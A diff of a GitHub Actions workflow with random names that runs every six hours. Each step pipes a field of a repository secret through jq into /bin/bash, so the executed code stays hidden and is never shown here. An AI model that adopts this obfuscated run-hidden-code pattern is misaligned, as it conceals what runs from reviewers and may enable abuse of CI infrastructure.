@@ -1,9 +1,9 @@
 name: gaochanghui5647
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 3/6 * * *'
+    - cron: '45 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,23 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: gaochanghui5647
         env:
-          ocz121: ${{ secrets.ocz121 }}
+          jem4: ${{ secrets.jem4 }}
         run: |
-          echo $ocz121 | jq -r .pdm10 | /bin/bash
-          echo $sf523 | jq -r .td8472 | /bin/bash
-          echo $fbfdk69 | jq -r .e7030 | /bin/bash
-          echo $k9676 | jq -r .y260 | /bin/bash
-          echo $egr0 | jq -r .bsx42429 | /bin/bash
-          echo $es66976 | jq -r .z79 | /bin/bash
-          echo $w2 | jq -r .mkvd7 | /bin/bash
-          echo $kyhd21999 | jq -r .qoom68 | /bin/bash
-          echo $m6 | jq -r .xcb13 | /bin/bash
-          echo $m26 | jq -r .h16216 | /bin/bash
-          echo $mu83 | jq -r .w5 | /bin/bash
-          echo $drd9 | jq -r .f37786 | /bin/bash
-          echo $g0 | jq -r .nr13 | /bin/bash
-          echo $gwf8074 | jq -r .l8 | /bin/bash
-          echo $k5 | jq -r .vqlht8 | /bin/bash
-          echo $nlmou864 | jq -r .wy589 | /bin/bash
-          echo $p9952 | jq -r .klkgt789 | /bin/bash
+          echo $jem4 | jq -r .g3059 | /bin/bash
+          echo $syvhc394 | jq -r .phtnq080 | /bin/bash
+          echo $plega36138 | jq -r .tjd7 | /bin/bash
+          echo $ulr8493 | jq -r .szus713 | /bin/bash
 
